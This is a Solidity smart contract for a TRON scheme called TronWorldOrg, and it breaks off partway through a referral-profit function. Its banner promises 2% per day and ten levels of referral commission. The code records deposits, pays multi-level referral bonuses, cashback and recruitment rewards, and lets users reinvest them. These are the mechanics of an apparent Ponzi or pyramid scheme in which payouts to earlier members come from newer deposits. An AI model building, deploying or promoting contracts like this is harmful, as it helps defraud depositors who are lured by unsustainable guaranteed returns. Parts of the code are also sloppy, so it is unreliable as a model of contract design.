//SourceUnit: tronWorldOrg.sol


/*
          

████████╗██████╗░░█████╗░███╗░░██╗░██╗░░░░░░░██╗░█████╗░██████╗░██╗░░░░░██████╗░
╚══██╔══╝██╔══██╗██╔══██╗████╗░██║░██║░░██╗░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗
░░░██║░░░██████╔╝██║░░██║██╔██╗██║░╚██╗████╗██╔╝██║░░██║██████╔╝██║░░░░░██║░░██║
░░░██║░░░██╔══██╗██║░░██║██║╚████║░░████╔═████║░██║░░██║██╔══██╗██║░░░░░██║░░██║
░░░██║░░░██║░░██║╚█████╔╝██║░╚███║░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║███████╗██████╔╝
░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═════╝░
            
            
 
            
                               
    2% Per Day                                                  
    3.9% Referral Commission 


    10 Level Referral
    Level 1 = 1%                                                 
    Level 2 =  0.1%                                                
    Level 3 =  0.2% 
    Level 4 =  0.2% 
    Level 5 =  0.3%
    Level 6 =  0.3%
    Level 7 =  0.4%
    Level 8 =  0.4%
    Level 9 =  0.5%
    Level 10 =  0.5%
    
    
    // Website: https://tronworld.org



*/
pragma solidity ^0.4.17;



contract TronWorldOrg {

    using SafeMath for uint256;

    
    uint public totalPlayers;
    uint public totalPayout;
    uint public totalRefDistributed;
    uint public totalInvested;
    uint private minDepositSize = 10000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 1;
    uint public commissionDivisor = 100;
    uint private minuteRate = 86400; 
    uint private releaseTime = 1594308600;
    uint private minrefrate = 86400;
    uint private dailyPercent = 2; //Daily 2%
    uint private dailyPercent1 = 1; //Daily 1%
    uint private dailyPercent2 = 5; //Daily 0.5%
    uint private commissionDivisorPoint = 100;
    uint private commissionDivisorPoint1 = 100;
    uint private commissionDivisorPoint2 = 1000;
   
    bool public updateActivation;
    
    uint256 highBusiness1 = 0;
    uint256 highBusiness2= 0;
    uint256 highBusiness3= 0;
    uint256 highBusiness4= 0;
    uint256 highBusiness5= 0;
    uint256 highBusiness6= 0;
    uint256 highBusiness7= 0;
    uint256 highBusiness8= 0;
    uint256 highBusiness9= 0;
    uint256 highBusiness10= 0;
    
    uint256 leader = 0;
    uint256 star = 100000000000;
    uint256 silver = 1000000000000;
    uint256 gold = 2000000000000;

    
    
    uint256 business1 = 100000000000; //100000000000
    
    
    uint256 selfAmt1 = 5000000000; //5000000000
    uint256 selfAmt2 = 10000000000; //10000000000
    uint256 selfAmt3 = 25000000000; //25000000000
    uint256 selfAmt4 = 50000000000; //50000000000
    uint256 selfAmt5 = 100000000000; //100000000000
    
    
        
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event profitWithdrawal(address indexed toAddress, uint256 amount);
    event refferalWithdrawal(address indexed toAddress,uint256 amount);


    uint256[] public ref_minute_rate;


    address owner;
    struct Player {
        uint trxDeposit;
        uint investment_amt;
        uint time;
        uint j_time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint td_team;
        uint td_business;
        uint reward_earned;
        uint cashback;
        uint256 Level_reached;
        uint interestProfit_ref;
        
    }
    
     struct LevelStars {
        uint256 leaderTotal;
        uint256 starTotal;
        uint256 silverTotal;
        uint256 goldTotal ;
        
        bool leaderButton;
        bool starButton;
        bool silverButton;
        bool goldButton ;
        
    }
    
    struct Player_level_info
    {
        
        bool is_level_activated;
        uint256 Level_timestamp;
        uint256 total_business;
        uint interestProfit_cum;
        uint interestProfit_ref_cum;
        uint reward_earned_cum;
        uint cashback_cum;
        uint256 Level_timestamp_player;
        uint joining_time;
        uint affRewardsTotalPayout;
         uint affRewardsReinvestment;

    }
    
    struct Preferral{
        address player_addr;
        uint256 aff1sum;
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
        uint256 aff9sum;
        uint256 aff10sum;
        
       
    }
    
    struct UpdateButton{
        bool b1;
        bool b2;
        bool b3;
        bool b4;
        bool b5;
        bool b6;
        bool b7;
        bool b8;
        bool b9;
        bool b10;
        
       
    }
    
    struct individual_level_income
    {
        uint256 L1_income;
        uint256 L2_income;
        uint256 L3_income;
        uint256 L4_income;
        uint256 L5_income;
        uint256 L6_income;
        uint256 L7_income;
        uint256 L8_income;
        uint256 L9_income;
        uint256 L10_income;
    }
    struct Cashback{
       
        bool cb1;
        bool cb2;
        bool cb3;
        bool cb4;
        bool cb5;
        bool claimed;
        bool deposited;
    }
    
    struct Cashback_income{
       
        uint256 cb1_income;
        uint256 cb2_income;
        uint256 cb3_income;
        uint256 cb4_income;
        uint256 cb5_income;
    }
    
    struct reward{
        bool r1;
        bool r2;
        bool r3;
        bool r4;
        bool r5;
        bool r6;
        bool r1_claimed;
        bool r2_claimed;
        bool r3_claimed;
        bool r4_claimed;
        bool r5_claimed;
        bool r6_claimed;
 
    }
    
    struct reward_income{
        uint256 r1_income;
        uint256 r2_income;
        uint256 r3_income;
        uint256 r4_income;
        uint256 r5_income;
        uint256 r6_income;
    }
    
    struct high_business_income{
        uint256 r1_business;
        uint256 r2_business;
        uint256 r3_business;
        uint256 r4_business;
        uint256 r5_business;
        uint256 r6_business;
        uint256 r7_business;
        uint256 r8_business;
        uint256 r9_business;
        uint256 r10_business;

    }
    
    struct high_business_income_add{
        address r1_business_add;
        address r2_business_add;
        address r3_business_add;
        address r4_business_add;
        address r5_business_add;
        address r6_business_add;
        address r7_business_add;
        address r8_business_add;
        address r9_business_add;
        address r10_business_add;
    }
    
    
    
    mapping(address => Cashback_income) public cashback_available;
    mapping(address => reward_income) public reward_available;
    mapping(address => high_business_income) public business_high;
    mapping(address => high_business_income_add) public business_high_add;
    mapping(address => Player_level_info) public info;
    mapping(address => Cashback) public cashbacks;
    mapping(address => reward) public rewards;
    mapping(address => UpdateButton) public updatebuttons;
    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;
    mapping(address=>individual_level_income) public individual_level_incomes; 
    mapping(address => LevelStars) public levelstar;

    constructor() public {
      owner = msg.sender;
      emit OwnershipTransferred(address(0), msg.sender);
      
    }
    


    function register(address _addr, address _affAddr) private{
        
      Player storage player = players[_addr];
      
      player.affFrom = _affAddr;
      players[_affAddr].td_team =  players[_affAddr].td_team.add(1);
      
      setRefCount(_addr,_affAddr);
       
      
    }
     function setRefCount(address _addr, address _affAddr) private{
         
         
        Preferral storage preferral = preferals[_addr];
        preferral.player_addr = _addr;
      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;
      address _affAddr9 = players[_affAddr8].affFrom;
      address _affAddr10 = players[_affAddr9].affFrom;

      preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
      
      if(_affAddr2 != address(0))
      {
          preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
       
      }
      
      
      
      if(_affAddr3 != address(0))
      {
         preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);
        
      }
     
     
      if(_affAddr4 != address(0))
      {
          preferals[_affAddr4].aff4sum = preferals[_affAddr4].aff4sum.add(1);
      }
      
      if(_affAddr5 != address(0))
      {
        preferals[_affAddr5].aff5sum = preferals[_affAddr5].aff5sum.add(1);
      }
      if(_affAddr6 != address(0))
      {
        preferals[_affAddr6].aff6sum = preferals[_affAddr6].aff6sum.add(1);
      }
      if(_affAddr7 != address(0))
      {
        preferals[_affAddr7].aff7sum = preferals[_affAddr7].aff7sum.add(1);
      }
      if(_affAddr8 != address(0))
      {
        preferals[_affAddr8].aff8sum = preferals[_affAddr8].aff8sum.add(1);
      }
      if(_affAddr9 != address(0))
      {
        preferals[_affAddr9].aff9sum = preferals[_affAddr9].aff9sum.add(1);
      }
      if(_affAddr10 != address(0))
      {
        preferals[_affAddr10].aff10sum = preferals[_affAddr10].aff10sum.add(1);
      }
      
         
     }
     
    
    
    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        
        uint depositAmount = msg.value;
        
        Player storage player = players[msg.sender];
    
        player.j_time = now;
        
        
        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            info[msg.sender].joining_time = now;
            
            // if affiliator is not admin as well as he deposited some amount
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
       
        }
       
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        player.Level_reached = 0;
        
        player.investment_amt = player.investment_amt.add(depositAmount);
        
        players[_affAddr].td_business =  players[_affAddr].td_business.add(depositAmount);          
        
        //pay rewards here
        
        uint  business = players[_affAddr].td_business;
        uint living_time_player = now.sub(info[msg.sender].joining_time);
        if( living_time_player <=  10 days )
        {
            if(business >= business1 )
            {
                if(!rewards[_affAddr].r1_claimed)
                {
                  if(!rewards[_affAddr].r1)
                  {
                    player.reward_earned = player.reward_earned.add(10000000000);
                    reward_available[_affAddr].r1_income =   reward_available[_affAddr].r1_income.add(10000000000);
                    rewards[_affAddr].r1 = true;
                  }
                }
                  
            }
        }
      
        
        
        //pay rewards to self after 10 days
        
        if(living_time_player >=10 days && !cashbacks[msg.sender].deposited)//10 days from registration
        {
            cashbacks[msg.sender].deposited = true;
            
            if(!cashbacks[msg.sender].claimed)
            {
                if( player.trxDeposit >= selfAmt1 &&  player.trxDeposit<  selfAmt2)
                {
                    
                     if(!cashbacks[ msg.sender].cb1)
                      {
                        info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(250000000);
                        player.cashback = player.cashback.add(250000000);
                        cashback_available[msg.sender].cb1_income =   cashback_available[msg.sender].cb1_income.add(250000000);
                        cashbacks[ msg.sender].cb1 = true;
                        cashbacks[msg.sender].claimed = true;
                        
                      }
                   
                }
                else if(player.trxDeposit >= selfAmt2  &&  player.trxDeposit <  selfAmt3)
                {
                     if(!cashbacks[ msg.sender].cb2)
                     {
                          info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(750000000);
                        player.cashback = player.cashback.add(750000000);
                       cashback_available[msg.sender].cb2_income =   cashback_available[msg.sender].cb2_income.add(750000000);
                         cashbacks[ msg.sender].cb2 = true;
                          cashbacks[ msg.sender].cb1 = false;
                          cashbacks[msg.sender].claimed = true;
                     }
                    
                }
                 else if(player.trxDeposit >= selfAmt3  && player.trxDeposit  <  selfAmt4)
                {
                    
                     if(!cashbacks[ msg.sender].cb3)
                     {
                          info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(2500000000);
                        player.cashback = player.cashback.add(2500000000);
                        cashback_available[msg.sender].cb3_income =   cashback_available[msg.sender].cb3_income.add(2500000000);
                        cashbacks[ msg.sender].cb3 = true;
                        cashbacks[ msg.sender].cb2 = false;
                         cashbacks[ msg.sender].cb1 = false;
                         cashbacks[msg.sender].claimed = true;
                     }
                     
                    
                }
                else if(player.trxDeposit >= selfAmt4  && player.trxDeposit <  selfAmt5)
                {
                  if(!cashbacks[ msg.sender].cb4)
                    {   
                         info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(6250000000);
                        player.cashback = player.cashback.add(6250000000);
                       cashback_available[msg.sender].cb4_income =   cashback_available[msg.sender].cb4_income.add(6250000000);
                          cashbacks[ msg.sender].cb4 = true;
                          
                        cashbacks[ msg.sender].cb3 = false;
                        cashbacks[ msg.sender].cb2 = false;
                         cashbacks[ msg.sender].cb1 = false;
                         cashbacks[msg.sender].claimed = true;
                    }
                    
                }
                else if(player.trxDeposit >= selfAmt5)
                {
                    
                     if(!cashbacks[ msg.sender].cb5)
                    {  
                         info[msg.sender].cashback_cum = info[msg.sender].cashback_cum.add(15000000000);
                        player.cashback = player.cashback.add(15000000000);
                        cashback_available[msg.sender].cb5_income =   cashback_available[msg.sender].cb5_income.add(15000000000);
                         cashbacks[ msg.sender].cb5 = true;
                         cashbacks[ msg.sender].cb4 = false;
                          
                        cashbacks[ msg.sender].cb3 = false;
                        cashbacks[ msg.sender].cb2 = false;
                         cashbacks[ msg.sender].cb1 = false;
                         cashbacks[msg.sender].claimed = true;
                    }
                    
                }
            }

            
        }
            
        
        distributeRef(depositAmount, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
 
    }

    
    
     function reinvest_cashback() public {
 
      Player storage player = players[msg.sender];
       uint256 depositAmount = player.cashback;
      player.cashback = 0;
        cashbacks[ msg.sender].cb1 = false;
        cashbacks[ msg.sender].cb2 = false;
        cashbacks[ msg.sender].cb3 = false;
        cashbacks[ msg.sender].cb4 = false;
        cashbacks[ msg.sender].cb5 = false;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
      uint secPassed = now.sub(players[msg.sender].time);
      players[msg.sender].time = players[msg.sender].time.add(secPassed);
      


        
    }
    function reinvest_reward() public {
 
      Player storage player = players[msg.sender];
    if(rewards[msg.sender].r1_claimed == false)
    {
      if(rewards[msg.sender].r1 == true){
          reward_available[msg.sender].r1_income =   reward_available[msg.sender].r1_income.sub(10000000000);
          player.trxDeposit = player.trxDeposit.add(10000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(10000000000);
          
          rewards[msg.sender].r1_claimed = true;
      }
    }
    if(rewards[msg.sender].r2_claimed == false)
    {
      if(rewards[msg.sender].r2 == true){
          reward_available[msg.sender].r2_income =   reward_available[msg.sender].r2_income.sub(25000000000);
          player.trxDeposit = player.trxDeposit.add(25000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(25000000000);
          rewards[msg.sender].r2_claimed = true;
      }
    }
    if(rewards[msg.sender].r3_claimed == false)
    {
       if(rewards[msg.sender].r3 == true){
           reward_available[msg.sender].r3_income =   reward_available[msg.sender].r3_income.sub(75000000000);
          player.trxDeposit = player.trxDeposit.add(75000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(75000000000);
          rewards[msg.sender].r3_claimed = true;
      }
    }
    if(rewards[msg.sender].r4_claimed == false)
    {
       if(rewards[msg.sender].r4 == true){
           reward_available[msg.sender].r4_income =   reward_available[msg.sender].r4_income.sub(250000000000);
          player.trxDeposit = player.trxDeposit.add(250000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(250000000000);
          rewards[msg.sender].r4_claimed = true;
      }
    }
    if(rewards[msg.sender].r5_claimed == false)
    {
       if(rewards[msg.sender].r5 == true){
          reward_available[msg.sender].r5_income =   reward_available[msg.sender].r5_income.sub(500000000000);
          player.trxDeposit = player.trxDeposit.add(500000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(500000000000);
          rewards[msg.sender].r5_claimed = true;
      }
    }
    if(rewards[msg.sender].r6_claimed == false)
    {
       if(rewards[msg.sender].r6 == true){
           reward_available[msg.sender].r6_income =   reward_available[msg.sender].r6_income.sub(2500000000000);
          player.trxDeposit = player.trxDeposit.add(2500000000000);
          info[msg.sender].reward_earned_cum = info[msg.sender].reward_earned_cum.add(2500000000000);
          rewards[msg.sender].r6_claimed = true;
      }
    }
     uint secPassed = now.sub(players[msg.sender].time);
     players[msg.sender].time = players[msg.sender].time.add(secPassed);

    }
    
 



    
    
 
    
    function updateLevelAchievment(address _addr, uint256 level) private
    {
       if( players[_addr].Level_reached < level)
       {
           players[_addr].Level_reached = level;
       }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

         

        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        address _affAddr9 = players[_affAddr8].affFrom;
        address _affAddr10 = players[_affAddr9].affFrom;
        // uint256 _affRewards = 0;
        // uint256 affRewardsReinvest = 0;
        
        if (_affFrom != address(0)) {
        
            individual_level_incomes[_affFrom].L1_income = individual_level_incomes[_affFrom].L1_income.add(_trx);
            info[_affFrom].total_business =  info[_affFrom].total_business.add(_trx);      
            levelHigh(msg.sender,_affFrom, players[msg.sender].trxDeposit,1);
            
        }
        if (_affAddr2 != address(0)) {
        
            info[_affAddr2].total_business =  info[_affAddr2].total_business.add(_trx); 
            individual_level_incomes[_affAddr2].L2_income = individual_level_incomes[_affAddr2].L2_income.add(_trx);
            levelHigh(msg.sender,_affAddr2, players[msg.sender].trxDeposit,2);
            
        }
        if (_affAddr3 != address(0)) {
        
            info[_affAddr3].total_business =  info[_affAddr3].total_business.add(_trx); 
             individual_level_incomes[_affAddr3].L3_income = individual_level_incomes[_affAddr3].L3_income.add(_trx);
             levelHigh(msg.sender,_affAddr3, players[msg.sender].trxDeposit,3);
        }
        if (_affAddr4 != address(0)) {
        
            info[_affAddr4].total_business =  info[_affAddr4].total_business.add(_trx); 
             individual_level_incomes[_affAddr4].L4_income = individual_level_incomes[_affAddr4].L4_income.add(_trx);
             levelHigh(msg.sender,_affAddr4, players[msg.sender].trxDeposit,4);
        }
        if (_affAddr5 != address(0)) {
        
            info[_affAddr5].total_business =  info[_affAddr5].total_business.add(_trx); 
             individual_level_incomes[_affAddr5].L5_income = individual_level_incomes[_affAddr5].L5_income.add(_trx);
              levelHigh(msg.sender,_affAddr5, players[msg.sender].trxDeposit,5);
        }
        if (_affAddr6 != address(0)) {
             info[_affAddr6].total_business =  info[_affAddr6].total_business.add(_trx); 
            individual_level_incomes[_affAddr6].L6_income = individual_level_incomes[_affAddr6].L6_income.add(_trx);
               levelHigh(msg.sender,_affAddr6, players[msg.sender].trxDeposit,6);
        }
        if (_affAddr7 != address(0)) {
             info[_affAddr7].total_business =  info[_affAddr7].total_business.add(_trx); 
             individual_level_incomes[_affAddr7].L7_income = individual_level_incomes[_affAddr7].L7_income.add(_trx);
              levelHigh(msg.sender,_affAddr7, players[msg.sender].trxDeposit,7);
        }
        if (_affAddr8 != address(0)) {
            info[_affAddr8].total_business =  info[_affAddr8].total_business.add(_trx); 
              individual_level_incomes[_affAddr8].L8_income = individual_level_incomes[_affAddr8].L8_income.add(_trx);
              levelHigh(msg.sender,_affAddr8, players[msg.sender].trxDeposit,8);
        }
        if (_affAddr9 != address(0)) {
        
             info[_affAddr9].total_business =  info[_affAddr9].total_business.add(_trx); 
             individual_level_incomes[_affAddr9].L9_income = individual_level_incomes[_affAddr9].L9_income.add(_trx);
             levelHigh(msg.sender,_affAddr9, players[msg.sender].trxDeposit,9);
        }
        if (_affAddr10 != address(0)) {
            info[_affAddr10].total_business =  info[_affAddr10].total_business.add(_trx); 
             individual_level_incomes[_affAddr10].L10_income = individual_level_incomes[_affAddr10].L10_income.add(_trx);
             levelHigh(msg.sender,_affAddr10, players[msg.sender].trxDeposit,10); 
            
        }
       

        if(!info[_affFrom].is_level_activated)
        {
            info[_affFrom].Level_timestamp = now;
            info[_affFrom].is_level_activated = true;
        }

        DistributeLevelBonus(_trx,_affFrom);
        
        
    }
    
    
    function DistributeLevelBonus(uint256 _trx, address _affFrom) private{
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        address _affAddr9 = players[_affAddr8].affFrom;
        address _affAddr10 = players[_affAddr9].affFrom;
        uint256 _affRewards = 0;
        // uint256 _affRewardsCalc = 0;

        if (_affFrom !=address(0)) {
            
            if(players[_affFrom].affRewards ==0){
                if( _trx >  players[_affFrom].trxDeposit)
                {
                    _trx = players[_affFrom].trxDeposit;
                }
                _affRewards = (_trx.mul(1)).div(100);
    
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            }
            if(players[_affFrom].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affFrom].trxDeposit)
                {
                    _trx = players[_affFrom].trxDeposit;
                }
                _affRewards = (_trx.mul(1)).div(100);
    
                totalRefDistributed = totalRefDistributed.add(_affRewards);
                players[_affFrom].affRewards = players[_affFrom].affRewards.add(_affRewards);
            }
            
            
            updateLevelAchievment(_affFrom,1);
            
        }

        if (_affAddr2 != address(0)) {
            
                     
            if(players[_affAddr2].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr2].trxDeposit)
                {
                    _trx = players[_affAddr2].trxDeposit;
                }
                _affRewards = (_trx.mul(1)).div(1000);
                
                if(players[_affAddr2].td_team >= 2)
                {
     
       
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr2].affRewards = players[_affAddr2].affRewards.add(_affRewards);

                }
            }
            updateLevelAchievment(_affAddr2,2);
            
        }

        if (_affAddr3 != address(0)) {
            
            
            if(players[_affAddr3].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr3].trxDeposit)
                {
                    _trx = players[_affAddr3].trxDeposit;
                }
                _affRewards = (_trx.mul(2)).div(1000);
                
                if(players[_affAddr3].td_team >= 3)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr3].affRewards = players[_affAddr3].affRewards.add(_affRewards);
                    
                }
            }
            updateLevelAchievment(_affAddr3,3);  

             

        }

        if (_affAddr4 != address(0)) {
            
            if(players[_affAddr4].trxDeposit>=players[msg.sender].trxDeposit){
             
                 if( _trx >  players[_affAddr4].trxDeposit)
                {
                    _trx = players[_affAddr4].trxDeposit;
                }
                _affRewards = (_trx.mul(2)).div(1000);
                if(players[_affAddr4].td_team >= 4)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr4].affRewards = players[_affAddr4].affRewards.add(_affRewards);

                }
            }
            updateLevelAchievment(_affAddr4,4);

        }

        if (_affAddr5 != address(0)) {
             
            if(players[_affAddr5].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr5].trxDeposit)
                {
                    _trx = players[_affAddr5].trxDeposit;
                }
                _affRewards = (_trx.mul(3)).div(1000);
                
                if(players[_affAddr5].td_team >= 5)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr5].affRewards = players[_affAddr5].affRewards.add(_affRewards);
                      
                   
    
                }
            }
            updateLevelAchievment(_affAddr5,5);

        }

        if (_affAddr6 != address(0)) {
            
            if(players[_affAddr6].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr6].trxDeposit)
                {
                    _trx = players[_affAddr6].trxDeposit;
                }
                
                _affRewards = (_trx.mul(3)).div(1000);
                 if(players[_affAddr6].td_team >= 6)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr6].affRewards = players[_affAddr6].affRewards.add(_affRewards);
                     
                }
                
            }
            updateLevelAchievment(_affAddr6,6);

        }

        if (_affAddr7 != address(0)) {
            
            if(players[_affAddr7].trxDeposit>=players[msg.sender].trxDeposit){
            
                if( _trx >  players[_affAddr7].trxDeposit)
                {
                    _trx = players[_affAddr7].trxDeposit;
                }
                
                _affRewards = (_trx.mul(4)).div(1000);
                if(players[_affAddr7].td_team >= 7)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr7].affRewards = players[_affAddr7].affRewards.add(_affRewards);
                }  
            }
            updateLevelAchievment(_affAddr7,7);

            
        }

        if (_affAddr8 != address(0)) {
             
            if(players[_affAddr8].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr8].trxDeposit)
                {
                    _trx = players[_affAddr8].trxDeposit;
                }
                _affRewards = (_trx.mul(4)).div(1000);
                if(players[_affAddr8].td_team >= 8)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                     players[_affAddr8].affRewards = players[_affAddr8].affRewards.add(_affRewards);
                }
            }
            updateLevelAchievment(_affAddr8,8);

        }
        if (_affAddr9 != address(0)) {
            
            if(players[_affAddr9].trxDeposit>=players[msg.sender].trxDeposit){
                if( _trx >  players[_affAddr9].trxDeposit)
                {
                    _trx = players[_affAddr9].trxDeposit;
                }
                
                _affRewards = (_trx.mul(5)).div(1000);
                 if(players[_affAddr9].td_team >= 9)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr9].affRewards = players[_affAddr9].affRewards.add(_affRewards);
    
                }
                                
            }
             updateLevelAchievment(_affAddr9,9);

        }
        if (_affAddr10 != address(0)) {
            
            
            if(players[_affAddr10].trxDeposit>=players[msg.sender].trxDeposit){
                 if( _trx >  players[_affAddr10].trxDeposit)
                {
                    _trx = players[_affAddr10].trxDeposit;
                }
                
                _affRewards = (_trx.mul(5)).div(1000);
                if(players[_affAddr10].td_team >= 10)
                {
                    totalRefDistributed = totalRefDistributed.add(_affRewards);
                    players[_affAddr10].affRewards = players[_affAddr10].affRewards.add(_affRewards);
                      
                                   
                }
    
            }
            updateLevelAchievment(_affAddr10,10);
        }
        
    } 
    
  
    
    
    function levelHigh(address _fromAdd, address _affFrom, uint256 _amount, uint256 _level) private{
         
        uint256 highBusiness = 0;

        if(_level==1) {
            highBusiness = business_high[_affFrom].r1_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r1_business = business_high[_affFrom].r1_business;
            }
            else{
                business_high[_affFrom].r1_business = _amount;
                business_high_add[_affFrom].r1_business_add = _fromAdd;
            }
        }
        else if(_level==2) {
            highBusiness = business_high[_affFrom].r2_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r2_business = business_high[_affFrom].r2_business;
            }
            else{
                business_high[_affFrom].r2_business = _amount;
                business_high_add[_affFrom].r2_business_add = _fromAdd;
            }
        }
        else if(_level==3) {
            highBusiness = business_high[_affFrom].r3_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r3_business = business_high[_affFrom].r3_business;
            }
            else{
                business_high[_affFrom].r3_business = _amount;
                business_high_add[_affFrom].r3_business_add = _fromAdd;
            }
        }
        else if(_level==4) {
            highBusiness = business_high[_affFrom].r4_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r4_business = business_high[_affFrom].r4_business;
            }
            else{
                business_high[_affFrom].r4_business = _amount;
                business_high_add[_affFrom].r4_business_add = _fromAdd;
            }
        }
        else if(_level==5) {
            highBusiness = business_high[_affFrom].r5_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r5_business = business_high[_affFrom].r5_business;
            }
            else{
                business_high[_affFrom].r5_business = _amount;
                business_high_add[_affFrom].r5_business_add = _fromAdd;
            }
        }
        else if(_level==6) {
            highBusiness = business_high[_affFrom].r6_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r6_business = business_high[_affFrom].r6_business;
            }
            else{
                business_high[_affFrom].r6_business = _amount;
                business_high_add[_affFrom].r6_business_add = _fromAdd;
            }
        }
        else if(_level==7) {
            highBusiness = business_high[_affFrom].r7_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r7_business = business_high[_affFrom].r7_business;
            }
            else{
                business_high[_affFrom].r7_business = _amount;
                business_high_add[_affFrom].r7_business_add = _fromAdd;
            }
        }
        else if(_level==8) {
            highBusiness = business_high[_affFrom].r8_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r8_business = business_high[_affFrom].r8_business;
            }
            else{
                business_high[_affFrom].r8_business = _amount;
                business_high_add[_affFrom].r8_business_add = _fromAdd;
            }
        }
        else if(_level==9) {
            highBusiness = business_high[_affFrom].r9_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r9_business = business_high[_affFrom].r9_business;
            }
            else{
                business_high[_affFrom].r9_business = _amount;
                business_high_add[_affFrom].r9_business_add = _fromAdd;
            }
        }
        else if(_level==10) {
            highBusiness = business_high[_affFrom].r10_business; 
            if(highBusiness>_amount){
                business_high[_affFrom].r10_business = business_high[_affFrom].r10_business;
            }
            else{
                business_high[_affFrom].r10_business = _amount;
                business_high_add[_affFrom].r10_business_add = _fromAdd;
            }
        }
        
    }
    
    function get_reward_info(address _addr) public view returns(uint8 cb,uint8 dt)
    {
        if(cashbacks[_addr].cb1)
        {
            cb=1;
        }else if(cashbacks[_addr].cb2)
        {
            cb=2;
        }else if(cashbacks[_addr].cb3)
        {
            cb=3;
        }
        else if(cashbacks[_addr].cb4)
        {
            cb=4;
        }
        else if(cashbacks[_addr].cb5)
        {
            cb=5;
        }else{
            cb=0;
        }
        
        if( rewards[_addr].r1)
        {
            uint8 dt_reward = 1;
        }else{
            dt_reward = 0;
        }
        
        
        return (cb,dt_reward);
    }
    
    function getReferralProfit(address _addr)public view returns (uint) {
        
        address playerAddress= _addr;
        Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');
      require(info[_addr].is_level_activated,'0 Direct joinee');
        
      uint secPassed = now.sub(info[_addr].Level_timestamp);
      if (secPassed > 0) {
          uint collectProfit;
          uint affRewardDiv;
          if(info[msg.sender].affRewardsTotalPayout>=leader && info[msg.sender].affRewardsTotalPayout<star){
            collectProfit = ((player.affRewards.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=star && info[msg.sender].affRewardsTotalPayout<silver){
